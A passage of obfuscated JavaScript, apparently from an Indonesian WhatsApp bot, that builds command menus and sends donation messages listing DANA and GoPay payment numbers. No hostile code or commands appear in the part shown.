_0x504f2a={};_0x504f2a[_0x134458(0x403,0x572,0x267,0x46d)+'id']=[sender,ini_mark],_0x504f2a[_0x15af3d(0x8f1,0xcbe,0xacf,0xd65)+_0x134458(0xab1,0xab1,0x603,0xba3)]=0x3e7,_0x504f2a[_0x15af3d(0x588,0x5f2,0x783,0x1a0)+'d']=!![];const _0x25d2c0={};_0x25d2c0[_0x15af3d(0xc2e,0xe20,0x7dc,0xb89)]=fkontak,_0x25d2c0[_0x15af3d(0xabb,0xc25,0xce2,0xaff)+'o']=_0x504f2a,_0x25d2c0[_0x15af3d(0x62a,0x95f,0x91b,0x6ec)+_0x134458(0x477,0x484,0x6c1,0x3f3)]=!![],alpha['sendMessag'+'e'](from,optionsp1,text,_0x25d2c0);}if(subscribezeeoneofc=='bayar_dana'+'18'){var ini_info=_0x15af3d(0x56d,0x21b,0x77a,0x21e)+sender[_0x15af3d(0x53f,0x248,0x906,0x463)]('@')[0x153d+-0x1e7d+-0x1*-0x940]+(_0x134458(0x680,0x7d2,0x454,0x96c)+_0x15af3d(0xaae,0xa41,0xe43,0xa4b)+'e\x20nomor\x20aj'+'a\x20atau\x20pak'+_0x134458(0x844,0xb97,0x7db,0x99a));const _0x182b92={};_0x182b92['displayTex'+'t']='NOMOR';const _0x1397b8={};_0x1397b8[_0x134458(0xae0,0x757,0x7bc,0xb6b)]=_0x15af3d(0x382,0x551,0x30c,0x154)+_0x134458(0x5d5,0x65a,0x54e,0x774),_0x1397b8[_0x15af3d(0x5a7,0x9a1,0x816,0x3f0)]=_0x182b92,_0x1397b8[_0x15af3d(0xa52,0xc6f,0xe5f,0x663)]=0x1;const _0x276672={};_0x276672[_0x134458(0x599,0x96f,0x711,0x14f)+'t']=_0x134458(0x714,0xbd2,0x500,0x572);const _0x511b8c={};_0x511b8c[_0x15af3d(0xc33,0x916,0xe63,0xaac)]=_0x15af3d(0xb4b,0x794,0x77c,0x802),_0x511b8c[_0x15af3d(0x5a7,0xa23,0xf7,0x745)]=_0x276672,_0x511b8c['type']=0x1;const buttons5=[_0x1397b8,_0x511b8c],_0x390a94={};_0x390a94[_0x15af3d(0x94a,0x727,0x956,0x45a)+'t']=ini_info,_0x390a94[_0x15af3d(0xb05,0xa82,0xab7,0xcfa)]=''+tampilTanggal+enter+tampilWaktu+enter+enter+'©\x20'+creator,_0x390a94['buttons']=buttons5,_0x390a94[_0x134458(0x43c,0x7e9,0x8d1,0x335)]=0x1;const btn5=_0x390a94,_0x16287e={};_0x16287e[_0x134458(0xa1b,0xbfe,0xbb8,0xebe)]='hi',_0x16287e[_0x15af3d(0x8f1,0x859,0x4c4,0x757)+_0x15af3d(0xc04,0xb0d,0xd87,0xed4)]=0x3b9aca00,_0x16287e[_0x15af3d(0x588,0xad,0x218,0x5f7)+'d']=!![],_0x16287e[_0x15af3d(0x62a,0x55f,0x791,0x4e9)+_0x15af3d(0x5ca,0x4ce,0x4cc,0x6fd)]=!![],_0x16287e[_0x15af3d(0x556,0x223,0x6fa,0x27d)+'id']=[sender];const _0x548ee6={};_0x548ee6['caption']='Botwea\x20©2k'+'21',_0x548ee6['contextInf'+'o']=_0x16287e,_0x548ee6[_0x15af3d(0xc2e,0x966,0xaaf,0x909)]=ftroli,_0x548ee6[_0x134458(0x4d7,0x713,0x40d,0x63f)+_0x134458(0x477,-0x6b,0x8da,0x4dc)]=!![],alpha['sendMessag'+'e'](from,btn5,MessageType[_0x134458(0x151,0x2b5,0x2a4,0x157)+_0x15af3d(0xaf6,0xc5e,0xba3,0xa7e)],_0x548ee6);}if(subscribezeeoneofc==_0x15af3d(0x382,0x732,0x455,0x4ca)+'ana18'){optionsp2=_0x15af3d(0xa0a,0xb03,0x646,0x92f)+_0x134458(0x804,0xb74,0x8b0,0xc35)+_0x15af3d(0x77d,0x80e,0xb67,0x474)+'\x20bersedeka'+'h\x20baik\x20lak'+'i-laki\x20mau'+_0x134458(0x642,0x54b,0x938,0x420)+'uan\x20dan\x20me'+_0x15af3d(0x376,0x775,0x265,0x73d)+_0x134458(0x8ba,0x9bc,0xbcf,0x7eb)+'ah\x20pinjama'+_0x15af3d(0x6fa,0xa41,0x2ba,0x3c3)+_0x15af3d(0x6df,0x4e1,0xac2,0x417)+_0x134458(0x40e,0x60f,0x7b2,0x903)+_0x15af3d(0x7c7,0xc77,0x3df,0x455)+_0x15af3d(0x5ec,0x950,0x536,0x326)+_0x15af3d(0x8d2,0x40c,0xbd6,0xd32)+_0x15af3d(0x547,0x44d,0x42a,0x467)+';\x20dan\x20bagi'+'\x20mereka\x20pa'+_0x134458(0x56c,0x63b,0x137,0x398)+'banyak.”\x20('+_0x15af3d(0x3d7,0x6ee,0x110,0x878)+_0x15af3d(0x5c7,0x663,0x54a,0xe8)+'\x20Nama\x20:\x20_'+pushname+('_\x0a•\x20Nomor\x20'+':\x20_@')+sender['split']('@')[-0xbf*-0x1a+0x210b+-0x3471]+('_\x0a\x0a*PAYMEN'+_0x134458(0x733,0x35c,0x72f,0x35c))+nomor_dana+(_0x134458(0xa97,0xc81,0x877,0x9bf)+_0x134458(0x40a,0x84e,0x18d,0x7fe))+ini_mark[_0x15af3d(0x53f,0x7bd,0x638,0x337)]('@')[-0x74*0x37+-0x1cb*-0xb+0x533]+'_';const _0x43fa20={};_0x43fa20[_0x15af3d(0x556,0x87b,0x5d3,0x8d1)+'id']=[sender,ini_mark],_0x43fa20[_0x134458(0x79e,0x34b,0x5a4,0x8ab)+_0x15af3d(0xc04,0x832,0x9d1,0xf19)]=0x3e7,_0x43fa20[_0x134458(0x435,-0xa8,0x690,0x5c9)+'d']=!![];const _0x68f0b5={};_0x68f0b5[_0x15af3d(0xc2e,0xeff,0xefa,0x8c5)]=fkontak,_0x68f0b5[_0x134458(0x968,0xe01,0x72d,0x71a)+'o']=_0x43fa20,_0x68f0b5[_0x134458(0x4d7,0x552,0x72a,0x892)+_0x134458(0x477,0x367,0x5b4,0x79e)]=!![],alpha[_0x134458(0x982,0xdac,0x783,0xc87)+'e'](from,optionsp2,text,_0x68f0b5);}if(subscribezeeoneofc==_0x15af3d(0x812,0xc06,0x48c,0xc2c)+'y18'){var ini_info=_0x134458(0x41a,-0xa7,0x392,0x3d5)+sender['split']('@')[0x164b+-0xb17*0x1+-0xb34]+(',\x20kamu\x20mau'+_0x15af3d(0xaae,0x986,0x828,0xb11)+_0x15af3d(0x387,0x2c0,0x60e,0x95)+'a\x20atau\x20pak'+'e\x20qr\x20code?');const _0x1c3d84={};_0x1c3d84[_0x15af3d(0x6ec,0xaeb,0x339,0x4a9)+'t']=_0x134458(0x8c3,0x5c1,0x462,0x4a0);const _0x339f2d={};_0x339f2d[_0x15af3d(0xc33,0xc14,0xa2b,0x976)]=_0x134458(0x3d3,0x23a,0x1c6,0x360)+_0x15af3d(0x989,0xc6f,0x640,0xb69),_0x339f2d[_0x15af3d(0x5a7,0x2fc,0x580,0x34e)]=_0x1c3d84,_0x339f2d[_0x15af3d(0xa52,0xa0d,0xb23,0x856)]=0x1;const _0x493bfc={};_0x493bfc[_0x134458(0x599,0x238,0x13b,0x63a)+'t']=_0x134458(0x714,0x81b,0x235,0x8cf);const _0x2a086c={};_0x2a086c[_0x134458(0xae0,0x993,0xd2e,0x90d)]=_0x15af3d(0xbda,0x817,0x73a,0x10a2),_0x2a086c[_0x134458(0x454,0x37,0x179,0x2ac)]=_0x493bfc,_0x2a086c[_0x15af3d(0xa52,0xc78,0xa25,0x85c)]=0x1;const buttons6=[_0x339f2d,_0x2a086c],_0x205d61={};_0x205d61['contentTex'+'t']=ini_info,_0x205d61[_0x134458(0x9b2,0xb65,0x6cd,0xcdf)]=''+tampilTanggal+enter+tampilWaktu+enter+'©\x20'+creator,_0x205d61['buttons']=buttons6,_0x205d61[_0x134458(0x43c,0x4ab,0xe7,0x8ee)]=0x1;const btn6=_0x205d61,_0xfdb893={};_0xfdb893['text']='hi',_0xfdb893['forwarding'+_0x134458(0xab1,0xb4a,0x839,0xc73)]=0x3b9aca00,_0xfdb893[_0x134458(0x435,-0x7a,0x2fe,0x6e1)+'d']=!![],_0xfdb893[_0x134458(0x4d7,0x166,0x41c,0x45f)+'ral']=!![],_0xfdb893[_0x15af3d(0x556,0x2b4,0x336,0x19e)+'id']=[sender];const _0x424807={};_0x424807[_0x15af3d(0x540,0x7a7,0x9b7,0x169)]=_0x15af3d(0x63d,0x8d2,0x4a7,0x82e)+'21',_0x424807[_0x134458(0x968,0x62d,0xb4f,0x639)+'o']=_0xfdb893,_0x424807[_0x134458(0xadb,0x72f,0xb40,0xde6)]=ftroli,_0x424807[_0x134458(0x4d7,0x95d,0x4f0,0x9cb)+_0x134458(0x477,0x8a2,0x479,0x788)]=!![],alpha[_0x15af3d(0xad5,0xb43,0x7d8,0xd55)+'e'](from,btn6,MessageType[_0x15af3d(0x2a4,-0x209,0x789,0x3f9)+_0x15af3d(0xaf6,0xc71,0xb27,0x6dc)],_0x424807);}if(subscribezeeoneofc==_0x134458(0x3d3,0xef,0x219,0xc9)+_0x15af3d(0x989,0xd77,0xb29,0x833)){optionsp3='“Sesungguh'+_0x15af3d(0x957,0x866,0x637,0xd75)+_0x134458(0x62a,0x1e5,0x603,0x4c3)+_0x134458(0x747,0x2fe,0xa35,0x9b7)+'h\x20baik\x20lak'+_0x15af3d(0x30c,-0xef,0x5df,0x403)+'pun\x20peremp'+_0x134458(0x7b7,0xa70,0x8da,0x8f8)+_0x134458(0x223,0x3e4,0x1bf,-0x285)+_0x134458(0x8ba,0x586,0x412,0xd63)+_0x15af3d(0x641,0x30c,0x964,0x613)+_0x134458(0x5a7,0x20c,0x78f,0x4fc)+_0x134458(0x58c,0x884,0x35f,0x7be)+_0x15af3d(0x561,0x385,0x81c,0x2d1)+_0x15af3d(0x7c7,0x45b,0x7ab,0x445)+'an\x20(ganjar'+_0x15af3d(0x8d2,0x839,0x800,0xcc7)+'ada\x20mereka'+';\x20dan\x20bagi'+_0x134458(0x568,0x5fd,0x7a6,0x331)+'hala\x20yang\x20'+_0x134458(0xaff,0xa50,0x84d,0x8bd)+_0x15af3d(0x3d7,-0x2e,0x7ca,0x3ab)+_0x15af3d(0x5c7,0x96a,0x8be,0x1bd)+_0x134458(0x313,0x2ae,0x4e4,0x660)+pushname+('_\x0a•\x20Nomor\x20'+_0x134458(0x1d8,-0x20e,0xd0,0x5ec))+sender[_0x134458(0x3ec,0x2a1,0x173,0x4ee)]('@')[-0xd83*0x2+0x47*0x83+0x94f*-0x1]+(_0x15af3d(0x2ff,0x73a,0x5c4,0x5ea)+_0x134458(0x733,0x8dc,0xa1a,0x65c))+nomor_gopay+('\x0a\x0a_Powered'+'\x20by\x20@')+ini_mark[_0x15af3d(0x53f,0x6ec,0x641,0x6c)]('@')[0x1c4a+-0x3*0x52+0x21*-0xd4]+'_';const _0x14852c={};_0x14852c[_0x134458(0x403,-0xe7,0x4f0,-0xe0)+'id']=[sender,ini_mark],_0x14852c[_0x134458(0x79e,0xae4,0x6e3,0x959)+_0x134458(0xab1,0x988,0xee7,0xba8)]=0x3e7,_0x14852c[_0x134458(0x435,0x5d9,0x64d,0x76d)+'d']=!![];const _0x43a632={};_0x43a632['quoted']=fkontak,_0x43a632['contextInf'+'o']=_0x14852c,_0x43a632['sendEpheme'+_0x15af3d(0x5ca,0x508,0x759,0x5ed)]=!![],alpha[_0x15af3d(0xad5,0x96c,0xe5b,0xa3e)+'e'](from,optionsp3,text,_0x43a632);}subscribezeeoneofc==_0x15af3d(0xaa3,0x6b7,0x9a4,0x69c)&&(console[_0x15af3d(0xb9a,0xe4e,0x912,0xab9)](color(time,'magenta'),color(_0x15af3d(0x41f,0x1c3,0x89f,0x438)+_0x15af3d(0xae5,0xb43,0xc1b,0xe6a)+_0x15af3d(0x7a7,0x828,0x8df,0x6bb))),reply('☕'));if(subscribezeeoneofc=='Command'){console[_0x15af3d(0xb9a,0xc97,0xc2f,0xebc)](color(time,_0x134458(0x64d,0x1e3,0x588,0x38f)),color(_0x15af3d(0xba0,0xa52,0xa50,0xb3c)+_0x15af3d(0x2e7,0x232,0x303,0x394)));const _0x4238e1={};_0x4238e1[_0x15af3d(0x655,0x234,0x1f5,0xa36)]=_0x134458(0x729,0x2e7,0xbce,0xa1e)+'ot',_0x4238e1[_0x15af3d(0xbe0,0xc06,0xc2d,0xdd7)+'n']='_choose\x20th'+_0x15af3d(0x73d,0x70f,0x987,0x4d0)+_0x15af3d(0x9d5,0xca3,0x8c8,0x873)+_0x134458(0x987,0x887,0xb65,0xcef)+_0x15af3d(0xc44,0xda3,0x1052,0x1017)+'d_',_0x4238e1['rowId']='0';const _0x16c66f={};_0x16c66f[_0x15af3d(0x655,0x36e,0x38c,0x509)]=_0x134458(0x2f0,-0xa7,0x439,0x10d)+_0x15af3d(0x4d3,0x10a,0x7cd,0x15),_0x16c66f[_0x15af3d(0xba1,0xd20,0xf52,0x898)]=[_0x4238e1];const _0x344e2a={};_0x344e2a[_0x134458(0x502,0x745,0x4cf,0x27f)]=_0x134458(0x3d8,0x2b7,0x2d7,0x6bc)+'nu',_0x344e2a[_0x15af3d(0xbe0,0xfe5,0x73f,0x81e)+'n']=_0x15af3d(0x397,-0x4c,-0x107,0x88)+'is\x20if\x20you\x20'+_0x134458(0x882,0x4da,0xaf7,0xc45)+_0x134458(0x67b,0x6e3,0x20d,0x2d3)+_0x134458(0x673,0x806,0x80a,0x7c7)+_0x134458(0x9e9,0x518,0x65c,0x6c2),_0x344e2a[_0x15af3d(0x333,0x41a,0x76f,0x743)]='0';const _0x532fd3={};_0x532fd3[_0x134458(0x502,0x3b1,0x90c,0xaa)]='Sub\x20Menu\x20k'+'e-1',_0x532fd3[_0x134458(0xa4e,0xbcc,0x61f,0xc28)]=[_0x344e2a];const _0x586d79={};_0x586d79[_0x134458(0x502,0x234,0x80b,0x198)]=_0x15af3d(0x92d,0x664,0x8c8,0xcef),_0x586d79[_0x134458(0xa8d,0x6b8,0xb2c,0x872)+'n']=_0x134458(0x244,0xfd,-0xdd,-0x1b8)+_0x134458(0x5ea,0x952,0x6d6,0x255)+_0x134458(0x882,0x66f,0x804,0x49a)+_0x15af3d(0x3cb,0x66,0x817,0x1a9)+_0x134458(0xa1c,0xb63,0xb87,0xc2d)+_0x134458(0x7df,0x7c6,0x72e,0xa15),_0x586d79['rowId']='0';const _0x20b2b2={};_0x20b2b2[_0x15af3d(0x655,0x812,0x725,0x871)]=_0x15af3d(0xc5c,0xd33,0x114a,0xfad)+_0x15af3d(0x2eb,-0xe9,0x5af,0x3b8),_0x20b2b2['rows']=[_0x586d79];const _0x563c10={};_0x563c10[_0x15af3d(0x655,0xae5,0x281,0xa15)]=_0x15af3d(0x7b0,0x8a2,0x376,0x488)+'u',_0x563c10[_0x134458(0xa8d,0xf45,0x698,0x896)+'n']='_choose\x20th'+_0x15af3d(0x73d,0x50b,0x2e7,0xb98)+'want\x20to\x20us'+'e\x20the\x20conv'+_0x15af3d(0x8f4,0x9c9,0x475,0xbd4)+'mmand_',_0x563c10['rowId']='0';const _0x53f2a7={};_0x53f2a7[_0x134458(0x502,0x2c4,0x110,0x232)]=_0x15af3d(0xc5c,0xf3c,0xbfa,0x961)+'e-3',_0x53f2a7[_0x134458(0xa4e,0xcbf,0x7ea,0x825)]=[_0x563c10];const _0x520bf0={};_0x520bf0[_0x134458(0x502,0x2ab,0x86,0x344)]='funmenu',_0x520bf0[_0x15af3d(0xbe0,0x1091,0xbf3,0xa69)+'n']=_0x134458(0x244,-0x1b6,0x282,-0x39)+_0x15af3d(0x73d,0x83e,0xc14,0x4a9)+_0x15af3d(0x9d5,0x72b,0xb03,0xd99)+_0x134458(0x1b1,0x5a6,-0x56,0x38c)+_0x134458(0xaf1,0x94d,0xa36,0x780)+'d_',_0x520bf0['rowId']='0';const _0x47a90f={};_0x47a90f[_0x15af3d(0x655,0x2fb,0x337,0xaef)]='Sub\x20Menu\x20k'+_0x15af3d(0x80a,0xa05,0xb49,0x4a4),_0x47a90f['rows']=[_0x520bf0];const _0x43a0e5={};_0x43a0e5[_0x15af3d(0x655,0xac6,0x559,0xa90)]=_0x134458(0x849,0x3e9,0x6ef,0x392),_0x43a0e5['descriptio'+'n']=_0x134458(0x244,-0x1b8,0x5d6,0x2d9)+_0x15af3d(0x73d,0x3ad,0xb61,0x88b)+'want\x20to\x20us'+'e\x20the\x20make'+_0x134458(0x46d,0x4c3,0x52b,0x3c5)+'and_',_0x43a0e5[_0x15af3d(0x333,0xbe,0x557,0x632)]='0';const _0x3881ad={};_0x3881ad['title']=_0x134458(0xb09,0x873,0x825,0x80d)+_0x15af3d(0x96d,0x902,0xda6,0xaae),_0x3881ad[_0x134458(0xa4e,0xe09,0xf2d,0x93d)]=[_0x43a0e5];const _0x1981ba={};_0x1981ba[_0x15af3d(0x655,0x9cc,0x482,0x2e4)]=_0x15af3d(0x521,0x987,0x498,0x4d6),_0x1981ba[_0x15af3d(0xbe0,0x92c,0x1085,0x868)+'n']=_0x134458(0x244,0x221,-0x1ea,0x61c)+_0x134458(0x5ea,0x700,0xabb,0x560)+_0x15af3d(0x9d5,0xcb7,0xa53,0x88d)+_0x15af3d(0x550,0x40e,0x383,0xb9)+'rmenu\x20comm'+_0x134458(0x7df,0xb16,0x647,0xcc9),_0x1981ba['rowId']='0';const _0x4ee86f={};_0x4ee86f[_0x15af3d(0x655,0x2c7,0xa89,0x3a0)]=_0x134458(0xb09,0xb03,0xee6,0x634)+_0x134458(0x696,0x894,0x216,0x267),_0x4ee86f[_0x134458(0xa4e,0x9a8,0x88a,0x8a7)]=[_0x1981ba];const _0x1c0ba2={};_0x1c0ba2[_0x15af3d(0x655,0x2e4,0x683,0x5e7)]=_0x15af3d(0x487,0x3a4,0x90b,0x580),_0x1c0ba2[_0x15af3d(0xbe0,0x947,0x99d,0xade)+'n']=_0x15af3d(0x397,0x1f,0x43b,-0xab)+'is\x20if\x20you\x20'+_0x15af3d(0x9d5,0xcf6,0x717,0x7ae)+_0x134458(0x8fb,0x971,0xbc2,0xcdf)+'rmenu\x20comm'+'and_',_0x1c0ba2[_0x15af3d(0x333,0x7da,-0x1bd,-0x91)]='0';const _0x1f3fd0={};_0x1f3fd0[_0x15af3d(0x655,0x695,0x8d8,0x72e)]=_0x134458(0xb09,0x6f3,0x7e3,0xac3)+_0x15af3d(0x904,0x790,0xd05,0x4fa),_0x1f3fd0[_0x134458(0xa4e,0xedb,0x566,0xa17)]=[_0x1c0ba2];const _0x5c0f7e={};_0x5c0f7e[_0x134458(0x502,0x544,0x5c0,0x102)]=_0x15af3d(0x3df,-0xea,0x7bd,0x5f8)+'u',_0x5c0f7e[_0x15af3d(0xbe0,0x99d,0xc1c,0x86d)+'n']=_0x15af3d(0x397,0x804,0x290,0x8)+_0x15af3d(0x73d,0x386,0x4a7,0x9e1)+'want\x20to\x20us'+_0x134458(0x976,0xdb0,0xaf0,0xb19)+_0x134458(0x6fa,0x375,0x3e4,0xb6c)+_0x134458(0x920,0x873,0xc69,0x9ff),_0x5c0f7e[_0x15af3d(0x333,0x7a,0x50e,0x33e)]='0';const _0xf9bd99={};_0xf9bd99[_0x15af3d(0x655,0x994,0x8ed,0x944)]=_0x134458(0xb09,0x7e7,0x91f,0x69e)+'e-8',_0xf9bd99['rows']=[_0x5c0f7e];const _0x1214bb={};_0x1214bb[_0x134458(0x502,0x73b,0x2ae,0x9dd)]=_0x15af3d(0xb22,0xbad,0xdac,0xfff),_0x1214bb[_0x134458(0xa8d,0xe6d,0xeef,0x8d8)+'n']=_0x15af3d(0x397,0x1cf,0x477,0x5f9)+_0x15af3d(0x73d,0xbe6,0x65f,0x951)+_0x15af3d(0x9d5,0x5ab,0xddb,0xd88)+_0x134458(0x881,0x807,0xc74,0xc7d)+'enu\x20comman'+'d_',_0x1214bb[_0x134458(0x1e0,0x57c,0x66,-0x304)]='0';const _0xb4c2bb={};_0xb4c2bb[_0x134458(0x502,0x665,0x825,0x681)]='Sub\x20Menu\x20k'+'e-9',_0xb4c2bb[_0x134458(0xa4e,0x812,0xe42,0xf24)]=[_0x1214bb];const _0x5ac134={};_0x5ac134[_0x15af3d(0x655,0x6f4,0x4da,0x682)]='upmenu',_0x5ac134[_0x134458(0xa8d,0xdc5,0x87b,0xbca)+'n']='_choose\x20th'+'is\x20if\x20you\x20'+_0x134458(0x882,0x72d,0xb09,0x972)+_0x134458(0x325,0x5ad,0x4e1,0xc4)+_0x15af3d(0x40f,0x39f,0x12d,0x2a0)+'_',_0x5ac134[_0x134458(0x1e0,0x202,-0x293,-0x14a)]='0';const _0x241277={};_0x241277[_0x15af3d(0x655,0x9a6,0x3ab,0xa98)]=_0x134458(0xb09,0x977,0xb99,0xcd9)+'e-10',_0x241277['rows']=[_0x5ac134];const _0x4591fe={};_0x4591fe[_0x15af3d(0x655,0x73a,0x1d0,0x6c2)]='gacha\x20ceca'+'n',_0x4591fe[_0x134458(0xa8d,0xf5d,0xa54,0x5a4)+'n']=_0x15af3d(0x397,0x444,0x857,0x473)+_0x134458(0x5ea,0x856,0x2f2,0x135)+_0x134458(0x882,0x5d1,0x495,0x965)+'e\x20the\x20gach'+'acecan\x20com'+_0x15af3d(0x8d4,0xb6a,0x52a,0x6bf),_0x4591fe[_0x15af3d(0x333,0x813,-0x19,0x21f)]='0';const _0x10f39b={};_0x10f39b[_0x15af3d(0x655,0x1ee,0x66b,0x4ff)]=_0x15af3d(0xc5c,0xeef,0xc85,0x10a3)+_0x15af3d(0x49f,0x82,0x791,0x94a),_0x10f39b[_0x134458(0xa4e,0xcf2,0x6e7,0x75e)]=[_0x4591fe];const _0x5e20fe={};_0x5e20fe[_0x15af3d(0x655,0x73f,0x2c7,0x6da)]=_0x134458(0xa3a,0x69b,0x96e,0xad3)+_0x15af3d(0x4d1,0x7d7,0x2d7,0x48),_0x5e20fe[_0x134458(0xa8d,0x828,0xe9e,0xa90)+'n']=_0x134458(0x244,-0x1e0,-0x201,0x1f2)+_0x134458(0x5ea,0x5f9,0x957,0x18e)+_0x15af3d(0x9d5,0xa71,0x8a7,0xe39)+_0x15af3d(0x3fb,-0x3e,0x72,-0xc5)+_0x134458(0x88c,0x77c,0xcd1,0x39f)+'d_',_0x5e20fe[_0x134458(0x1e0,0x3fb,0x62c,0x424)]='0';const _0x182ccc={};_0x182ccc[_0x15af3d(0x655,0xb22,0x823,0x34f)]=_0x15af3d(0xc5c,0x836,0xe8f,0x8b4)+'e-12',_0x182ccc[_0x134458(0xa4e,0x7d5,0xa61,0xcdc)]=[_0x5e20fe];const _0x19fecb={};_0x19fecb[_0x134458(0x502,0x8cf,0x74e,0x2c2)]=_0x15af3d(0x855,0x3b6,0x4a1,0x449),_0x19fecb['descriptio'+'n']=_0x15af3d(0x397,0x34,0x709,-0x101)+'is\x20if\x20you\x20'+_0x15af3d(0x9d5,0xb58,0x9a0,0x7f5)+'e\x20the\x20nsfw'+_0x15af3d(0x9f5,0x8ee,0xaef,0x9a6)+'nd_',_0x19fecb[_0x134458(0x1e0,-0x136,-0x205,0x699)]='0';const _0x4efc1c={};_0x4efc1c[_0x15af3d(0x655,0x9d9,0xaf9,0xa3b)]=_0x15af3d(0xc5c,0x10c8,0x1019,0xe17)+_0x134458(0x8a1,0x41a,0xab7,0x45f),_0x4efc1c[_0x134458(0xa4e,0x8fb,0x608,0x861)]=[_0x19fecb];const _0x44c24b={};_0x44c24b[_0x15af3d(0x655,0xac0,0x3a8,0x6e1)]=_0x134458(0xaf6,0xdf6,0x737,0xfc4)+'u',_0x44c24b[_0x15af3d(0xbe0,0x72c,0x988,0x7de)+'n']=_0x134458(0x244,0x590,-0xc,-0x1e)+_0x15af3d(0x73d,0x80a,0x761,0xc2a)+'want\x20to\x20us'+_0x134458(0x575,0x871,0x860,0x32f)+_0x134458(0xaa9,0xd3f,0xe39,0xe0f)+_0x15af3d(0xa73,0xbf9,0x829,0x99b),_0x44c24b[_0x15af3d(0x333,0x7f3,0x6dc,-0x194)]='0';const _0x4ae5b4={};_0x4ae5b4[_0x134458(0x502,0x833,0x669,0x259)]=_0x134458(0xb09,0x856,0xec0,0xce8)+_0x134458(0x89f,0x699,0x72a,0xb7d),_0x4ae5b4['rows']=[_0x44c24b];const _0x5627a3={};_0x5627a3[_0x15af3d(0x655,0x765,0x26c,0x586)]=_0x15af3d(0xc39,0xa24,0xc71,0xa30)+'ct',_0x5627a3[_0x15af3d(0xbe0,0x1047,0xcdc,0xd4a)+'n']=_0x134458(0x244,-0x116,0x63b,0x376)+'is\x20if\x20you\x20'+_0x134458(0x882,0x415,0xb79,0x74b)+_0x134458(0x7d5,0x49f,0x728,0x54a)+_0x15af3d(0xb1c,0xca6,0xeeb,0x70e)+'enu\x20comman'+'d_',_0x5627a3['rowId']='0';const _0x24bdf9={};_0x24bdf9[_0x15af3d(0x655,0x83e,0x5ab,0xb30)]=_0x15af3d(0xc5c,0x807,0xe72,0xc4c)+_0x15af3d(0x461,0x6fa,0x3ae,0xcc),_0x24bdf9[_0x134458(0xa4e,0x70c,0xf15,0xd48)]=[_0x5627a3];const _0x5b3863={};_0x5b3863[_0x15af3d(0x655,0x286,0x54f,0x4ed)]=_0x134458(0x19a,-0x127,0x1d6,-0x225)+'n',_0x5b3863['descriptio'+'n']=_0x134458(0x244,0x476,0x32d,0x1fe)+_0x134458(0x5ea,0x8c5,0x390,0x1ec)+_0x15af3d(0x9d5,0x54c,0x527,0x64f)+_0x134458(0x632,0x7ca,0xb22,0x9db)+_0x134458(0x833,0xae9,0x52e,0xa5f)+_0x134458(0x920,0xbac,0xa4d,0x7ee),_0x5b3863[_0x134458(0x1e0,0x3a0,0x94,-0x234)]='0';const _0xb80ff1={};_0xb80ff1[_0x15af3d(0x655,0x7ed,0x8d0,0x1fb)]=_0x134458(0xb09,0x961,0x90a,0x8f6)+_0x134458(0x671,0x2c1,0x61b,0x9c6),_0xb80ff1[_0x134458(0xa4e,0xd85,0xd08,0xe66)]=[_0x5b3863];const _0x234563={};_0x234563[_0x15af3d(0x655,0x633,0x2c0,0x272)]=_0x15af3d(0x6cf,0x3dc,0x298,0x66d),_0x234563[_0x134458(0xa8d,0x9cb,0x660,0xb63)+'n']=_0x134458(0x244,0x345,-0x1ea,0x48a)+_0x134458(0x5ea,0x4de,0x63b,0x155)+_0x15af3d(0x9d5,0x86a,0x6db,0xdce)+'e\x20the\x20quot'+'esmenu\x20com'+_0x15af3d(0x8d4,0xd67,0x98c,0x7f3),_0x234563[_0x134458(0x1e0,0x2a7,0x530,-0x210)]='0';const _0x2fd952={};_0x2fd952[_0x15af3d(0x655,0x68a,0xa81,0x31b)]=_0x134458(0xb09,0x653,0xa1b,0x7f3)+'e-17',_0x2fd952[_0x134458(0xa4e,0xe62,0xd6d,0x5ac)]=[_0x234563];const _0x1ce2b0={};_0x1ce2b0[_0x15af3d(0x655,0x9be,0x2ac,0x266)]=_0x15af3d(0xbcf,0xa29,0xcab,0x8f7),_0x1ce2b0['descriptio'+'n']=_0x134458(0x244,0x5c5,0x4a2,0x43d)+_0x15af3d(0x73d,0xbc4,0xa04,0x27d)+_0x134458(0x882,0x4ab,0x8fb,0x476)+'e\x20the\x20anim'+_0x134458(0x427,0x240,0xfb,0x87d)+_0x134458(0x7df,0x4ea,0x316,0xba3),_0x1ce2b0[_0x134458(0x1e0,0x3d2,0x347,-0x257)]='0';const _0x4f76bf={};_0x4f76bf[_0x15af3d(0x655,0x99f,0x510,0x34a)]='Sub\x20Menu\x20k'+_0x134458(0x6be,0x81c,0x562,0x5bb),_0x4f76bf[_0x134458(0xa4e,0xf3d,0x5ef,0xa63)]=[_0x1ce2b0];const _0x3d955b={};_0x3d955b[_0x15af3d(0x655,0x3c1,0x532,0x89e)]='textpromen'+'u',_0x3d955b[_0x15af3d(0xbe0,0xa10,0x96a,0x8cf)+'n']=_0x134458(0x244,-0x1a9,0x31,-0x68)+_0x134458(0x5ea,0x8f5,0x662,0x7f6)+_0x134458(0x882,0x4df,0xce9,0x968)+'e\x20the\x20text'+_0x15af3d(0x751,0x4e0,0x5d4,0x466)+_0x15af3d(0xa73,0xb04,0xa8f,0x9d2),_0x3d955b[_0x134458(0x1e0,0x507,0xfa,0x451)]='0';const _0x10aae7={};_0x10aae7[_0x15af3d(0x655,0xaa0,0x53a,0x520)]=_0x15af3d(0xc5c,0xa29,0xa24,0x7ca)+'e-19',_0x10aae7[_0x134458(0xa4e,0xbc7,0xb5f,0xefb)]=[_0x3d955b];const _0x28ac84={};_0x28ac84[_0x134458(0x502,0x638,0xf8,0x2b1)]='photooxyme'+'nu',_0x28ac84[_0x15af3d(0xbe0,0xedd,0xb73,0xf83)+'n']=_0x134458(0x244,0x1ce,0x487,0x698)+'is\x20if\x20you\x20'+_0x134458(0x882,0x868,0xcff,0x687)+_0x134458(0x438,0x787,0x84d,0x69b)+_0x15af3d(0x5c5,0x4fa,0x619,0x1af)+'ommand_',_0x28ac84[_0x134458(0x1e0,0x6c9,0x250,-0x10e)]='0';const _0xad861a={};_0xad861a[_0x134458(0x502,0x487,0xf0,0x61e)]=_0x15af3d(0xc5c,0xc00,0xe82,0x8fe)+_0x15af3d(0x8cd,0xbcb,0x4c6,0xa8c),_0xad861a['rows']=[_0x28ac84];const 